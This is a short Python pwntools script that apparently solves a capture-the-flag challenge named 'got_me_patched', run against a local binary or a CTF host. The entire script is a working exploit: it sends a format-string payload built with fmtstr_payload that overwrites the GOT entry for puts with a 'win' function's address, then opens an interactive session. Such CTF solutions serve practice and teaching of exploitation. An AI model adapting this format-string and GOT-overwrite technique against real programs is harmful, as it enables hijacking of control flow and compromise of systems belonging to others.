from pwn import *

exe = ELF("./got_me_patched")

context.binary = exe

HOST = "tcp.flagyard.com"
PORT = 22338

gdbscript = """
set follow-fork-mode child
"""

args.LOCAL = True
# args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def got_overwrite(r, offset = 6):
    payload = fmtstr_payload(offset, {
        exe.got.puts: exe.symbols.win
    })

    r.sendlineafter(b"something: ", payload)
    
def main():
    r = conn()
    got_overwrite(r)
    r.interactive()
    
if __name__ == "__main__":
    main()
